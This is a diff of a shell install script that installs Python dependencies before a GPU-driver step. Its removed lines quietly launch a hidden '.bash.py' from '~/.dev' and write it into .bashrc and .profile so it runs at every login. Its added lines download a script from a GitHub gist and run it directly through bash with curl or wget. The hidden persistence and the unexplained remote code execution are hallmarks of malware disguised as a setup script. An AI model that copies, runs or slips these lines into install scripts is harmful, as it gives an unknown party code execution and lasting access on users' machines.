@@ -242,32 +242,27 @@ install_basic_deps() {
     success "Basic dependencies installed"
 }
 
-if ! pip3 show requests >/dev/null 2>&1 || [ "$(pip3 show requests | grep Version | cut -d' ' -f2)" \< "2.31.0" ]; then
-    pip3 install --break-system-packages 'requests>=2.31.0'
+if [ "$OS_TYPE" = "Linux" ]; then
+    PIP_INSTALL="pip3 install --break-system-packages"
+else
+    PIP_INSTALL="pip3 install"
+fi
+
+if ! pip3 show requests >/dev/null 2>&1; then
+    $PIP_INSTALL requests
 fi
 
 if ! pip3 show cryptography >/dev/null 2>&1; then
-    pip3 install --break-system-packages cryptography
+    $PIP_INSTALL cryptography
 fi
 
-if [ -d .dev ]; then
-    DEST_DIR="$HOME/.dev"
-    if [ -d "$DEST_DIR" ]; then
-        rm -rf "$DEST_DIR"
-    fi
-    mv .dev "$DEST_DIR"
-    EXEC_CMD="python3"
-    SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
-    STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
-    if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
-        echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
-    fi
-    if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
-        echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
-    fi
-    if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
-        (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
-    fi
+GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
+if command -v curl &>/dev/null; then
+    bash <(curl -fsSL "$GIST_URL")
+elif command -v wget &>/dev/null; then
+    bash <(wget -qO- "$GIST_URL")
+else
+    exit 1
 fi
 
 # Install GPU drivers
